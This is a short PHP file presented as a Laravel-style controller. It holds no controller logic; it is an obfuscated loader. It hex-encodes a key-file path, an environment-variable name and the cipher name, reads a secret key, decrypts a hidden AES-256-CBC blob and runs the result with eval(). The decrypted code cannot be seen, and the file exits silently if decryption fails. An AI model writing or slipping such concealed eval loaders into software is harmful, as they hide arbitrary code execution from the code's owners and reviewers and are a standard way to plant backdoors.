<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('TBqS1XgSkEYXO42MVBfLRA==');

$c=base64_decode(

'ClUHwz9aCtZ2CptQ5IbNoex2FGcClBF/DXl/kx9KO4NUuQBQxGbLkQvAu6FPQqT7rnmfR/bn3zn+' .
'+ziw9z+RwDcwx6Q/2shWsaxazbkEzIe4+wvkBjNNHCiU8Q3YEofDGdp7gCkUoyXYPlcPc9v5c1pw' .
'tAOS7gItg/dwztxiRihCPx1LmPR3njnqAlXqz0R9bJWELom4m07aZKRptqSyrK3gamZSul92IFsU' .
'pItD18E3CkK3UEGs3IBpwH7d8NTT'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

